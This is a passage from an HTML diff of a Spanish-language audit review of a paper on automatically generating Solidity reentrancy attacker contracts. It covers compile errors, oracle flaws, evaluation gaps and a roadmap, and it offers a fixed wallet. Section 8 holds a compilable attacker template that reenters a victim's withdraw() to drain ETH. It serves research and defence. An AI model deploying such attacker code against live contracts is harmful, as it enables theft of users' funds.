+        <dt>Recomendación</dt><dd><p>Aplicar CEI (poner <code>credit</code> a cero antes de la llamada), añadir <code>nonReentrant</code> (OpenZeppelin <code>ReentrancyGuard</code> o <code>ReentrancyGuardTransient</code> en cadenas con EIP‑1153) y emitir eventos. Versión corregida en la <a href="#correcciones">sección 8</a>. Es intencionado por ser el caso de estudio, pero el paper debería mostrar la versión segura y comprobar que la herramienta <em>no</em> genera un atacante contra ella. Ese test negativo falta.</p></dd>
+      </dl></div>
+    </details>
+
+    <h3>5.2 Método y evidencia</h3>
+    <details class="finding high" open>
+      <summary><span class="id">A‑01</span><span class="ttl">Los listados de Solidity no compilan</span><span class="sev high">Alta</span></summary>
+      <div class="body"><dl>
+        <dt>Ubicación</dt><dd>Listados 2, 3, 4 y 7.</dd>
+        <dt>Descripción</dt><dd>
+          <figure style="margin:8px 0 14px">
+<pre class="code"><code><span class="l bad"><span class="k">pragma solidity</span> &gt;=0.4.22 &lt;0.9.0;<span class="tag">E1</span></span>
+<span class="l"><span class="k">contract</span> Attacker {</span>
+<span class="l bad">  address private victim;<span class="tag">E2</span></span>
+<span class="l">  ...</span>
+<span class="l bad">      try victim.withdraw() {} catch {}<span class="tag">E2</span></span>
+<span class="l">  ...</span>
+<span class="l bad">    emit SuccessfullAttack(end &gt; init);<span class="tag">E3</span></span>
+<span class="l"></span>
+<span class="l"><span class="c">// Listado 3 (plantilla)</span></span>
+<span class="l bad">receive() {<span class="tag">E4</span></span>
+<span class="l bad">  try receive_sequence() {} catch {}<span class="tag">E5</span></span>
+<span class="l"><span class="c">// Listado 4</span></span>
+<span class="l bad">function trigger_sequence() payable {<span class="tag">E6</span></span></code></pre>
+          </figure>
+          <ul>
+            <li><b>E1.</b> El rango admite 0.4.22–0.5.x, pero <code>receive()</code>, <code>try/catch</code> y <code>{value: …}</code> requieren ≥ 0.6.2. Con un compilador del rango bajo, no compila.</li>
+            <li><b>E2.</b> <code>victim</code> se declara <code>address</code>, que no tiene miembros <code>withdraw</code> ni <code>donate</code>. Hace falta una interfaz (<code>IWallet victim</code>).</li>
+            <li><b>E3.</b> El evento se emite pero nunca se declara. Además se escribe <code>SuccessfullAttack</code> (doble “l”) mientras el texto y la salida del test dicen <code>SuccessfulAttack</code>.</li>
+            <li><b>E4.</b> <code>receive</code> debe ser <code>external payable</code>.</li>
+            <li><b>E5.</b> <code>try</code> solo funciona con llamadas externas. Llamar a una función interna dentro de <code>try</code> es un error de compilación; hay que usar <code>this.receive_sequence()</code> con visibilidad <code>external</code>.</li>
+            <li><b>E6.</b> Desde Solidity 0.5 la visibilidad es obligatoria, y las funciones <code>internal</code>/<code>private</code> no pueden ser <code>payable</code>. El Listado 7 usa <code>public payable</code>, incoherente con el 4.</li>
+          </ul>
+        </dd>
+        <dt>Impacto</dt><dd><p>Un lector no puede reproducir el resultado a partir del paper. Además, no se sabe qué plantilla se usó realmente, y el comportamiento depende de esos detalles (p. ej., una llamada externa a <code>this</code> cambia <code>msg.sender</code> y el gas disponible).</p></dd>
+        <dt>Recomendación</dt><dd><p>Publicar la plantilla real y compilarla en CI con una versión fijada de <code>solc</code>. Propuesta compilable en la <a href="#correcciones">sección 8</a>.</p></dd>
+      </dl></div>
+    </details>
+
+    <details class="finding high" open>
+      <summary><span class="id">A‑02</span><span class="ttl">El oráculo “el atacante gana ETH” no equivale a reentrancia</span><span class="sev high">Alta</span></summary>
+      <div class="body"><dl>
+        <dt>Ubicación</dt><dd>Listado 2, líneas 24–30; sección 5.</dd>
+        <dt>Descripción</dt><dd><p>El éxito se define como <code>balance_final &gt; balance_inicial</code> del atacante. Es una propiedad de <em>beneficio</em>, no de <em>reentrancia</em>.</p></dd>
+        <dt>Falsos positivos</dt><dd><p>Cualquier víctima que pague legítimamente más de lo depositado (intereses, recompensas, airdrops, un <code>faucet</code>, un reembolso con bonificación) dispara el oráculo aunque no haya reentrada. Como el generador también produce secuencias <em>sin</em> reentrada efectiva, el contraejemplo puede ser un uso normal del contrato.</p></dd>
+        <dt>Falsos negativos</dt><dd><ul>
+          <li>Robo de activos que no son ETH (ERC‑20, NFTs, participaciones).</li>
+          <li>Reentrancia que corrompe estado sin beneficio inmediato (votos duplicados, <code>totalSupply</code> inflado, precio manipulado que se explota en otra transacción).</li>
+          <li>Reentrancia de solo lectura, donde el perjudicado es un tercer contrato que lee un <code>view</code> inconsistente.</li>
+          <li>Ataques rentables pero cuyo beneficio en ETH no supera el coste del depósito dentro de la misma transacción.</li>
+        </ul></dd>
+        <dt>Recomendación</dt><dd><p>Combinar tres oráculos: (1) detección estructural de reentrada (contador de profundidad en <code>receive</code> y confirmación de que una llamada a la víctima se ejecutó mientras otra seguía activa, usando trazas <code>debug_traceTransaction</code>); (2) invariantes de la víctima, como <code>address(this).balance ≥ Σ credit</code>; (3) beneficio neto en ETH y en tokens. Los autores ya apuntan a (1) en el trabajo futuro; debería ser requisito, no mejora.</p></dd>
+      </dl></div>
+    </details>
+
+    <details class="finding high" open>
+      <summary><span class="id">A‑03</span><span class="ttl">Evaluación con un único contrato de juguete y una sola ejecución</span><span class="sev high">Alta</span></summary>
+      <div class="body"><dl>
+        <dt>Ubicación</dt><dd>Secciones 5 y 7.</dd>
+        <dt>Descripción</dt><dd><p>Toda la evidencia es un contrato de 2 funciones sin argumentos, cuya vulnerabilidad se conoce de antemano. No hay benchmark, ni contratos seguros (para medir falsos positivos), ni comparación con Slither, Mythril, Echidna, Foundry o ContractFuzzer, ni varias ejecuciones con media y dispersión del tiempo. Tampoco hay sección de amenazas a la validez.</p></dd>
+        <dt>Impacto</dt><dd><p>Las afirmaciones “el método es aplicable a otras vulnerabilidades” y “nuestro enfoque es original y mayormente automático” no tienen respaldo empírico. Que el resultado reducido coincida con el atacante escrito a mano es un buen indicio, pero en un espacio de búsqueda tan pequeño era esperable.</p></dd>
+        <dt>Recomendación</dt><dd><p>Evaluar sobre un corpus público (p. ej. la categoría <i>reentrancy</i> de SmartBugs‑curated, más contratos reales de incidentes conocidos), incluir contratos parcheados como controles negativos, reportar precisión, recall y tiempo hasta el primer exploit con al menos 10 semillas por contrato, y comparar con las herramientas citadas.</p></dd>
+      </dl></div>
+    </details>
+
+    <details class="finding high" open>
+      <summary><span class="id">A‑04</span><span class="ttl">Se omite trabajo previo de generación automática de exploits</span><span class="sev high">Alta</span></summary>
+      <div class="body"><dl>
+        <dt>Ubicación</dt><dd>Sección 6 (Related Work).</dd>
+        <dt>Descripción</dt><dd><p>El paper se presenta como original por producir “un contrato atacante reutilizable y mínimo”, pero no cita los trabajos más cercanos: <b>teEther</b> (Krupp y Rossow, USENIX Security 2018), que genera exploits automáticamente para contratos Ethereum mediante ejecución simbólica, y <b>EthPloit</b> (Zhang et al., SANER 2020), que genera exploits a partir de fuzzing. Harvey aparece en las referencias pero no se discute. Tampoco se mencionan Mythril, Manticore, Slither o sFuzz, habituales en este ámbito.</p></dd>
+        <dt>Recomendación</dt><dd><p>Reescribir la sección situando la aportación frente a teEther/EthPloit. La diferencia defendible es la integración con PBT con estado, la reutilización de modelos (Makina) y la reducción por shrinking, no la generación de exploits en sí.</p></dd>
+      </dl></div>
+    </details>
+
+    <h3>5.3 Diseño de la herramienta</h3>
+    <details class="finding med">
+      <summary><span class="id">M‑01</span><span class="ttl">La plantilla solo cubre reentrada por <code>receive()</code> con ETH</span><span class="sev med">Media</span></summary>
+      <div class="body"><dl>
+        <dt>Descripción</dt><dd><p>El punto de reentrada es fijo: <code>receive()</code>. No hay <code>fallback</code> (que se ejecuta cuando la víctima llama con datos), ni hooks <code>tokensReceived</code> (ERC‑777), <code>onERC721Received</code> o <code>onERC1155Received</code>. Tampoco se modela la reentrancia entre contratos (la víctima A llama al atacante, que reentra en el contrato B que comparte estado con A) ni la de solo lectura.</p></dd>
+        <dt>Escenario</dt><dd><p>Una víctima que paga en WETH o en un token ERC‑777, o que hace <code>safeTransferFrom</code> de un NFT, es vulnerable y la herramienta nunca lo detecta porque <code>receive()</code> no se ejecuta.</p></dd>
+        <dt>Recomendación</dt><dd><p>Generar también los hooks a partir de las interfaces que la víctima invoca (deducibles del bytecode o de las importaciones) y permitir más de un contrato víctima por modelo.</p></dd>
+      </dl></div>
+    </details>
+
+    <details class="finding med">
+      <summary><span class="id">M‑02</span><span class="ttl">Búsqueda ciega y coste alto por test: no escala</span><span class="sev med">Media</span></summary>
+      <div class="body"><dl>
+        <dt>Descripción</dt><dd><p>Las llamadas se eligen de forma aleatoria, sin retroalimentación de cobertura ni de distancia a la propiedad. Cada test levanta un Ganache nuevo y compila con <code>solc</code>. Con 2 funciones ya se necesitan más de 100 tests y 2,5 minutos.</p></dd>
+        <dt>Escenario</dt><dd><p>Con |F| funciones y secuencias de longitud k, el espacio crece como |F|<sup>k</sup> por cada uno de los dos huecos, más el espacio de argumentos. Un protocolo DeFi con 30 funciones y precondiciones de estado (aprobar, depositar, esperar un bloque) se vuelve inalcanzable con muestreo uniforme en tiempos razonables.</p></dd>
+        <dt>Recomendación</dt><dd><p>Usar una EVM en proceso (revm, Anvil con instantáneas <code>evm_snapshot/evm_revert</code>) en lugar de reiniciar Ganache, reutilizar el bytecode compilado entre candidatos que solo cambian datos, y guiar la generación con cobertura y con análisis estático previo (p. ej. priorizar funciones que hacen llamadas externas antes de escribir estado, según Slither).</p></dd>
+      </dl></div>
+    </details>
+
+    <details class="finding med">
+      <summary><span class="id">M‑03</span><span class="ttl">Generación de argumentos sin contexto ni conocimiento del despliegue</span><span class="sev med">Media</span></summary>
+      <div class="body"><dl>
+        <dt>Descripción</dt><dd><p>El propio paper reconoce que las direcciones aleatorias casi nunca existen en la cadena. Además, el atacante no puede pasarse a sí mismo como argumento (<code>withdraw(address to)</code>, <code>approve(spender)</code>) ni reutilizar valores devueltos. Otros casos no tratados: funciones sobrecargadas (mismo nombre, distinto selector), contratos <em>proxy</em> cuyo ABI no contiene las funciones de la implementación, constructores de la víctima con argumentos, roles (<code>onlyOwner</code>) y requisitos temporales.</p></dd>
+        <dt>Recomendación</dt><dd><p>Contexto con direcciones conocidas (<code>address(this)</code>, víctima, cuentas del entorno), reutilización de valores de retorno y diccionario de constantes extraídas del bytecode. Para proxies, cargar el ABI de la implementación y llamar a través del proxy.</p></dd>
+      </dl></div>
+    </details>
+
+    <details class="finding med">
+      <summary><span class="id">M‑04</span><span class="ttl">Dependencias obsoletas o de licencia comercial</span><span class="sev med">Media</span></summary>
+      <div class="body"><dl>
+        <dt>Descripción</dt><dd><p>Ganache forma parte de Truffle Suite, que ConsenSys dejó de mantener en 2023. Quedarse en él implica no tener los hardforks recientes (Shanghai, Cancún con EIP‑1153 y <code>MCOPY</code>, Prague/Pectra con EIP‑7702), así que la herramienta probaría contra una EVM que ya no existe en mainnet. Además, Quviq QuickCheck es comercial, lo que dificulta que terceros reproduzcan los resultados.</p></dd>
+        <dt>Recomendación</dt><dd><p>Migrar a Anvil (Foundry) o Hardhat Network, fijar el hardfork en la configuración, y garantizar que todo funciona con PropEr/PropCheck (libres). Publicar un contenedor con versiones exactas.</p></dd>
+      </dl></div>
+    </details>
+
+    <details class="finding med">
+      <summary><span class="id">M‑05</span><span class="ttl"><code>try/catch</code> silencioso: oculta causas y altera la semántica del ataque</span><span class="sev med">Media</span></summary>
+      <div class="body"><dl>
+        <dt>Descripción</dt><dd><p><code>try … {} catch {}</code> descarta cualquier error de la reentrada: revert de la víctima, falta de gas (solo se reenvían 63/64 del gas restante en cada nivel), límite de profundidad. La herramienta no puede distinguir “no es vulnerable” de “es vulnerable pero el intento falló por gas”.</p></dd>
+        <dt>Escenario</dt><dd><p>Si la víctima usa <code>credit[msg.sender] -= bal</code> en vez de <code>= 0</code>, en Solidity 0.8 los niveles exteriores hacen underflow y revierten. Cada revert queda capturado por el <code>try</code> del nivel superior, de modo que se deshacen y conservan niveles de forma alterna. El resultado final depende de la paridad de la profundidad alcanzada y puede ser “sin beneficio” aunque el contrato sea conceptualmente reentrante. El oráculo lo marcaría como seguro.</p></dd>
+        <dt>Recomendación</dt><dd><p>Registrar el motivo de cada error en eventos (<code>catch (bytes memory reason)</code>), limitar explícitamente la profundidad de reentrada como parámetro generado y hacer que el shrinking pueda explorar profundidades distintas.</p></dd>
+      </dl></div>
+    </details>
+
+    <details class="finding med">
+      <summary><span class="id">M‑06</span><span class="ttl">Herramienta de doble uso sin salvaguardas ni discusión ética</span><span class="sev med">Media</span></summary>
+      <div class="body"><dl>
+        <dt>Descripción</dt><dd><p>La salida es un exploit funcional. Aplicada al ABI de un contrato desplegado en mainnet, produce un ataque listo para usar. El paper no discute divulgación responsable ni restricciones de uso.</p></dd>
+        <dt>Recomendación</dt><dd><p>Diseñar la herramienta para ejecutar solo contra redes locales o <em>forks</em>, sin firmar transacciones hacia redes públicas por defecto. Añadir una sección sobre uso responsable y una política de divulgación para cuando se evalúen contratos reales.</p></dd>
+      </dl></div>
+    </details>
+
+    <h3>5.4 Detalles menores</h3>
+    <details class="finding low">
+      <summary><span class="id">B‑01</span><span class="ttl">Resultados no deterministas y sin semilla publicada</span><span class="sev low">Baja</span></summary>
+      <div class="body"><dl><dt>Descripción</dt><dd><p>El paper indica que distintas ejecuciones producen contraejemplos distintos y que el shrinking no garantiza mínimos. No se publican semillas, por lo que los números (113 → 15 comandos, 2:30 min) no se pueden comprobar.</p></dd>
+      <dt>Recomendación</dt><dd><p>Registrar la semilla de cada ejecución y reportar distribuciones (mediana, percentiles) en lugar de un solo valor.</p></dd></dl></div>
+    </details>
+    <details class="finding low">
+      <summary><span class="id">B‑02</span><span class="ttl">Unidades ambiguas (wei frente a ether)</span><span class="sev low">Baja</span></summary>
+      <div class="body"><dl><dt>Descripción</dt><dd><p>El texto habla de “1 ether” y el Listado 8 usa <code>value: 1</code>, que en Solidity y en las RPC de Ethereum significa 1 wei (10<sup>−18</sup> ETH). En un contexto financiero esa ambigüedad es un factor de 10<sup>18</sup>.</p></dd>
+      <dt>Recomendación</dt><dd><p>Usar siempre sufijos explícitos (<code>1 wei</code>, <code>1 ether</code>) en el código generado y en el texto.</p></dd></dl></div>
+    </details>
+    <details class="finding low">
+      <summary><span class="id">B‑03</span><span class="ttl">Nombres inconsistentes entre listados y texto</span><span class="sev low">Baja</span></summary>
+      <div class="body"><dl><dt>Descripción</dt><dd><p><code>victim</code> / <code>target</code>; <code>trigger_sequence</code> / <code>trigger_seq</code>; <code>var_victim</code> (texto) / <code>victim_address</code> (Listado 8); <code>SuccessfullAttack</code> / <code>SuccessfulAttack</code>. El texto dice que el Listado 8 tiene “tres líneas” de interacción cuando muestra comandos de despliegue y de llamada mezclados.</p></dd></dl></div>
+    </details>
+    <details class="finding low">
+      <summary><span class="id">B‑04</span><span class="ttl">Pragmas flotantes e incoherentes</span><span class="sev low">Baja</span></summary>
+      <div class="body"><dl><dt>Descripción</dt><dd><p>La víctima usa <code>^0.8.15</code> y el atacante <code>&gt;=0.4.22 &lt;0.9.0</code>. Un pragma flotante (SWC‑103) hace que el bytecode dependa de la versión instalada, y varias versiones 0.8.x tienen bugs de compilador documentados. En una herramienta de testing esto también afecta a la reproducibilidad.</p></dd>
+      <dt>Recomendación</dt><dd><p>Fijar la versión exacta (<code>pragma solidity 0.8.x;</code>) y registrar la versión de <code>solc</code> en cada contraejemplo.</p></dd></dl></div>
+    </details>
+    <details class="finding info">
+      <summary><span class="id">I‑01</span><span class="ttl">Erratas y referencias defectuosas</span><span class="sev info">Info</span></summary>
+      <div class="body"><dl><dt>Descripción</dt><dd><ul>
+        <li>Las referencias [5] y [6] son el mismo artículo (Makina, Erlang 2021), duplicado.</li>
+        <li>[14] “J. Smith. Echidna, a smart fuzzer for Ethereum, 2018” está incompleta. La cita canónica es Grieco et al., <i>Echidna: effective, usable, and fast fuzzing for smart contracts</i>, ISSTA 2020.</li>
+        <li>Los Listados 5 y 6 tienen el mismo pie (“ABI definition of function donate”); el 6 es la llamada generada.</li>
+        <li>Erratas: “blockhain”, “tests where generated”, “Binary Inteface”, “our method that can be applied”, “does not necessary mean”.</li>
+        <li>La figura 1 apenas aporta información textual; convendría describir el flujo en el texto (como la figura A de este informe).</li>
+      </ul></dd></dl></div>
+    </details>
+    <details class="finding info">
+      <summary><span class="id">I‑02</span><span class="ttl">La heurística <code>has_funds</code> no maximiza el drenaje</span><span class="sev info">Info</span></summary>
+      <div class="body"><dl><dt>Descripción</dt><dd><p><code>has_funds = victim.balance ≥ msg.value</code> detiene la reentrada cuando quedan menos fondos que el último retiro, así que puede dejar un remanente en la víctima. Para detectar la vulnerabilidad basta, pero no sirve para estimar el impacto máximo, que es lo que un auditor necesita para priorizar. Además, en el Listado 7 las secuencias se declaran <code>public</code>, por lo que cualquiera puede invocarlas en el atacante desplegado.</p></dd></dl></div>
+    </details>
+
+    <!-- 6 -->
+    <h2 id="errores"><span class="num">6</span>Errores típicos al usar este enfoque</h2>
+    <p>Errores que pueden cometer los equipos que adopten la herramienta, o los desarrolladores que se basen en sus resultados:</p>
+    <ol>
+      <li><b>Tomar “no se encontró atacante” como prueba de seguridad.</b> El testing muestra la presencia de errores, no su ausencia. Un resultado negativo solo dice que no se encontró un ataque <em>con esta plantilla, este presupuesto de tests y esta semilla</em>.</li>
+      <li><b>Probarlo solo con contratos sin argumentos.</b> El rendimiento del caso <code>Wallet</code> no se puede extrapolar a contratos con estado complejo.</li>
+      <li><b>Proteger solo la función señalada.</b> Corregir <code>withdraw</code> con <code>nonReentrant</code> y dejar sin proteger otra función que comparte estado abre una reentrancia entre funciones.</li>
+      <li><b>Confiar en <code>transfer</code>/<code>send</code> como defensa.</b> El límite de 2300 gas no es una garantía: los costes de gas cambian con los hardforks (EIP‑1884 ya rompió contratos en 2019) y algunas L2/zkEVM tienen otros costes.</li>
+      <li><b>Usar <code>msg.sender == tx.origin</code> para impedir contratos.</b> Con EIP‑7702 una EOA puede tener código, así que esa comprobación ya no garantiza que el llamante no reentre.</li>
+      <li><b>Ejecutar los exploits generados contra redes públicas</b>, aunque sea una testnet, sin un proceso de divulgación responsable.</li>
+      <li><b>Ignorar el coste de gas del atacante.</b> En mainnet un ataque rentable en wei puede no serlo después del gas. Para priorizar riesgos hay que medir el beneficio neto.</li>
+    </ol>
+
+    <!-- 7 -->
+    <h2 id="futuro"><span class="num">7</span>Riesgos y vulnerabilidades a futuro</h2>
+    <p>El ecosistema ha cambiado desde 2022 y algunos supuestos del paper ya no se sostienen:</p>
+    <div class="tbl">
+      <table>
+        <thead><tr><th>Cambio</th><th>Efecto sobre el método</th><th>Acción</th></tr></thead>
+        <tbody>
+          <tr><td><b>EIP‑7702</b> (Pectra, mayo 2025)</td><td>Las EOAs pueden delegar en código. Una transferencia a una “cuenta normal” puede ejecutar lógica y reentrar. El modelo de víctima que solo teme a contratos se queda corto.</td><td>Generar atacantes como cuentas EOA delegadas, no solo como contratos.</td></tr>
+          <tr><td><b>EIP‑1153</b> transient storage (Cancún, 2024)</td><td>Nuevos guards de reentrancia (<code>ReentrancyGuardTransient</code>) y nuevos errores al usar <code>TSTORE</code> como estado compartido dentro de la transacción.</td><td>Soportar el hardfork en la EVM de pruebas e incluir contratos que usan transient storage en el benchmark.</td></tr>
+          <tr><td><b>Reentrancia de solo lectura</b></td><td>Varios incidentes de 2022–2023 explotaron funciones <code>view</code> leídas por oráculos de terceros durante una reentrada. Con un modelo de dos contratos no se detecta.</td><td>Modelos con 3+ contratos y oráculos de invariantes sobre el contrato consumidor.</td></tr>
+          <tr><td><b>Composabilidad DeFi y flash loans</b></td><td>Los ataques modernos combinan reentrancia con préstamos instantáneos y manipulación de precios en una misma transacción.</td><td>Permitir que la secuencia de disparo incluya llamadas a otros protocolos del <em>fork</em>.</td></tr>
+          <tr><td><b>L2 y zkEVM</b></td><td>Diferencias de opcodes, gas y precompilados entre cadenas.</td><td>Parametrizar la EVM objetivo y repetir la búsqueda por cadena.</td></tr>
+          <tr><td><b>Generación de código con LLM</b></td><td>Cada vez más contratos se escriben con asistentes que reproducen patrones antiguos (CEI invertido, <code>call</code> antes de actualizar estado).</td><td>Un generador de atacantes encaja bien como test automático en CI para código generado.</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>La propia herramienta también tiene superficie de ataque. Ganache expone RPC con cuentas desbloqueadas en el puerto 8545; si se ejecuta en CI o en un servidor compartido escuchando en <code>0.0.0.0</code>, cualquiera en la red puede firmar transacciones con esas cuentas. Además, compila código Solidity generado y depende de paquetes npm sin mantenimiento, lo que supone un riesgo de cadena de suministro.</p>
+
+    <!-- 8 -->
+    <h2 id="correcciones"><span class="num">8</span>Código corregido</h2>
+    <h3>8.1 Víctima segura</h3>
+    <figure>
+<pre class="code"><code><span class="l"><span class="c">// SPDX-License-Identifier: MIT</span></span>
+<span class="l good"><span class="k">pragma solidity</span> 0.8.28;                         <span class="c">// versión fijada</span></span>
+<span class="l"></span>
+<span class="l"><span class="k">import</span> {ReentrancyGuard} from &quot;@openzeppelin/contracts/utils/ReentrancyGuard.sol&quot;;</span>
+<span class="l"></span>
+<span class="l"><span class="k">contract</span> Wallet is ReentrancyGuard {</span>
+<span class="l">  mapping(address =&gt; uint256) private credit;</span>
+<span class="l"></span>
+<span class="l">  event Deposited(address indexed who, uint256 amount);</span>
+<span class="l">  event Withdrawn(address indexed who, uint256 amount);</span>
+<span class="l">  error NothingToWithdraw();</span>
+<span class="l">  error TransferFailed();</span>
+<span class="l"></span>
+<span class="l">  <span class="k">function</span> deposit() external payable {</span>
+<span class="l">    require(msg.value &gt; 0);</span>
+<span class="l">    credit[msg.sender] += msg.value;</span>
+<span class="l">    emit Deposited(msg.sender, msg.value);</span>
+<span class="l">  }</span>
+<span class="l"></span>
+<span class="l good">  <span class="k">function</span> withdraw() external nonReentrant {<span class="tag ok">GUARD</span></span>
+<span class="l">    uint256 bal = credit[msg.sender];</span>
+<span class="l">    if (bal == 0) revert NothingToWithdraw();      <span class="c">// Checks</span></span>
+<span class="l good">    credit[msg.sender] = 0;                        <span class="c">// Effects</span><span class="tag ok">CEI</span></span>
+<span class="l">    (bool ok, ) = msg.sender.call{value: bal}(&quot;&quot;); <span class="c">// Interactions</span></span>
+<span class="l">    if (!ok) revert TransferFailed();</span>
+<span class="l">    emit Withdrawn(msg.sender, bal);</span>
+<span class="l">  }</span>
+<span class="l">}</span></code></pre>
+      <figcaption><b>Wallet corregido.</b> CEI y <code>nonReentrant</code> son defensas independientes; conviene aplicar las dos. Este contrato debería formar parte de la evaluación como control negativo.</figcaption>
+    </figure>
+
+    <h3>8.2 Plantilla de atacante compilable</h3>
+    <figure>
+<pre class="code"><code><span class="l"><span class="c">// SPDX-License-Identifier: MIT</span></span>
+<span class="l good"><span class="k">pragma solidity</span> 0.8.28;</span>
+<span class="l"></span>
+<span class="l good"><span class="k">interface</span> IVictim {                       <span class="c">// generada desde el ABI</span><span class="tag ok">E2</span></span>
+<span class="l">  <span class="k">function</span> donate() external payable;</span>
+<span class="l">  <span class="k">function</span> withdraw() external;</span>
+<span class="l">}</span>
+<span class="l"></span>
+<span class="l"><span class="k">contract</span> Attacker {</span>
+<span class="l">  IVictim private immutable victim;</span>
+<span class="l">  address private immutable owner;</span>
+<span class="l">  uint256 public depth;                      <span class="c">// oráculo estructural</span></span>
+<span class="l"></span>
+<span class="l good">  event AttackResult(bool reentered, bool profit, int256 delta);<span class="tag ok">E3</span></span>
+<span class="l">  event ReentryFailed(bytes reason);</span>
+<span class="l"></span>
+<span class="l">  constructor(IVictim victim_) { victim = victim_; owner = msg.sender; }</span>
+<span class="l"></span>
+<span class="l good">  receive() external payable {<span class="tag ok">E4</span></span>
+<span class="l">    if (msg.sender != address(victim)) return;</span>
+<span class="l">    if (address(victim).balance &lt; msg.value) return;  <span class="c">// has_funds</span></span>
+<span class="l">    depth++;</span>
+<span class="l good">    try this.receiveSequence() {} catch (bytes memory r) {<span class="tag ok">E5</span></span>
+<span class="l">      emit ReentryFailed(r);                 <span class="c">// no silenciar (M-05)</span></span>
+<span class="l">    }</span>
+<span class="l">  }</span>
+<span class="l"></span>
+<span class="l good">  <span class="k">function</span> receiveSequence() external {<span class="tag ok">E6</span></span>
+<span class="l">    require(msg.sender == address(this));</span>
+<span class="l">    <span class="c">/* generado por PBT, p. ej.: */</span> victim.withdraw();</span>
+<span class="l">  }</span>
+<span class="l"></span>
+<span class="l">  <span class="k">function</span> attack() external payable {</span>
+<span class="l">    require(msg.sender == owner);</span>
+<span class="l">    uint256 init = address(this).balance;    <span class="c">// incluye msg.value</span></span>
+<span class="l">    <span class="c">/* trigger generado por PBT, p. ej.: */</span></span>
+<span class="l">    victim.donate{value: 1 wei}();</span>
+<span class="l">    victim.withdraw();</span>
+<span class="l">    uint256 fin = address(this).balance;</span>
+<span class="l">    emit AttackResult(depth &gt; 0, fin &gt; init, int256(fin) - int256(init));</span>
+<span class="l">  }</span>
+<span class="l">}</span></code></pre>
+      <figcaption><b>Plantilla propuesta.</b> Corrige E1–E6, separa “hubo reentrada” de “hubo beneficio” (A‑02), registra los motivos de fallo (M‑05) y restringe quién puede ejecutar cada fase (I‑02). Las etiquetas remiten a los errores del hallazgo A‑01.</figcaption>
+    </figure>
+
+    <!-- 9 -->
+    <h2 id="mejoras"><span class="num">9</span>Hoja de ruta de mejoras</h2>
+    <div class="roadmap">
+      <section>
+        <h4>Corto plazo</h4>
+        <div class="when">1–4 semanas · reproducibilidad</div>
+        <ul>
+          <li>Repositorio público con plantilla real, modelos Makina y <code>Dockerfile</code>.</li>
+          <li>Listados que compilen, comprobados en CI.</li>
+          <li>Versiones fijadas de <code>solc</code>, EVM y semillas registradas.</li>
+          <li>Corregir referencias, unidades y nombres.</li>
+          <li>Añadir el Wallet seguro como control negativo.</li>
+        </ul>
+      </section>
+      <section>
+        <h4>Medio plazo</h4>
+        <div class="when">1–3 meses · método</div>
+        <ul>
+          <li>Oráculo triple: reentrada + invariantes + beneficio.</li>
+          <li>Anvil/revm con instantáneas en vez de Ganache.</li>
+          <li>Generador con contexto: <code>address(this)</code>, retornos, constantes.</li>
+          <li>Hooks <code>fallback</code>, ERC‑777/721/1155.</li>
+          <li>Priorización con análisis estático (Slither).</li>
+        </ul>
+      </section>
+      <section>
+        <h4>Largo plazo</h4>
+        <div class="when">3–9 meses · evidencia</div>
+        <ul>
+          <li>Benchmark en SmartBugs y en incidentes reales sobre <em>forks</em>.</li>
+          <li>Comparativa con Slither, Mythril, Echidna, Foundry, teEther.</li>
+          <li>Modelos de 3+ contratos, solo lectura y EIP‑7702.</li>
+          <li>Integración como plugin de Foundry para CI.</li>
+          <li>Sección de uso responsable.</li>
+        </ul>
+      </section>
+    </div>
+
+    <!-- 10 -->
+    <h2 id="valoracion"><span class="num">10</span>Valoración global</h2>
+    <p>Puntuación orientativa del auditor sobre 5, pensando en un paper de workshop que aspira a convertirse en una herramienta o en un artículo de conferencia principal.</p>
+    <div class="score">
+      <div class="row"><span>Idea y relevancia</span><div class="track"><div class="fill" style="width:80%"></div></div><span class="v">4 / 5</span></div>
+      <div class="row"><span>Claridad de la exposición</span><div class="track"><div class="fill" style="width:70%"></div></div><span class="v">3,5 / 5</span></div>
+      <div class="row"><span>Originalidad frente al estado del arte</span><div class="track"><div class="fill" style="width:50%"></div></div><span class="v">2,5 / 5</span></div>
+      <div class="row"><span>Corrección técnica del código</span><div class="track"><div class="fill" style="width:40%"></div></div><span class="v">2 / 5</span></div>
+      <div class="row"><span>Rigor experimental</span><div class="track"><div class="fill" style="width:20%"></div></div><span class="v">1 / 5</span></div>
+      <div class="row"><span>Reproducibilidad</span><div class="track"><div class="fill" style="width:20%"></div></div><span class="v">1 / 5</span></div>
+    </div>
+
+    <div class="callout">
+      <div class="h">Veredicto</div>
+      <p>Es una buena prueba de concepto para un workshop, y así se presenta (“preliminary work”). La combinación de PBT con estado, plantillas de ataque y shrinking es elegante y produce algo que pocas herramientas dan: un exploit mínimo y reproducible. No hay fallos graves en la idea. Sí hay fallos graves en la evidencia: código que no compila, un oráculo que no mide lo que dice medir y una evaluación de un solo caso. Corregir A‑01 a A‑04 es imprescindible antes de cualquier versión extendida.</p>
+    </div>
+
+    <!-- 11 -->
+    <h2 id="refs"><span class="num">11</span>Referencias</h2>
+    <ol class="refs">
+      <li>Ballesteros, I., Benac-Earle, C., Bueso de Barrio, L. E., Fredlund, L.-Å., Herranz, Á., Mariño, J. <i>Automatic Generation of Attacker Contracts in Solidity</i>. FMBC 2022, OASIcs vol. 105, art. 3. <a href="https://doi.org/10.4230/OASIcs.FMBC.2022.3" target="_blank" rel="noopener">doi:10.4230/OASIcs.FMBC.2022.3</a></li>
+      <li>Bueso de Barrio, L. E. et al. <i>Makina: a new QuickCheck state machine library</i>. Erlang Workshop 2021. <a href="https://doi.org/10.1145/3471871.3472964" target="_blank" rel="noopener">doi:10.1145/3471871.3472964</a></li>
+      <li>Krupp, J., Rossow, C. <i>teEther: Gnawing at Ethereum to Automatically Exploit Smart Contracts</i>. USENIX Security 2018.</li>
+      <li>Zhang, Q. et al. <i>EthPloit: From Fuzzing to Efficient Exploit Generation against Smart Contracts</i>. SANER 2020.</li>
+      <li>Grieco, G. et al. <i>Echidna: effective, usable, and fast fuzzing for smart contracts</i>. ISSTA 2020.</li>
+      <li>Jiang, B., Liu, Y., Chan, W. K. <i>ContractFuzzer: fuzzing smart contracts for vulnerability detection</i>. ASE 2018.</li>
+      <li>Atzei, N., Bartoletti, M., Cimoli, T. <i>A survey of attacks on Ethereum smart contracts (SoK)</i>. POST 2017.</li>
+      <li>SWC Registry: <a href="https://swcregistry.io/docs/SWC-107" target="_blank" rel="noopener">SWC‑107 Reentrancy</a>, SWC‑103 Floating Pragma.</li>
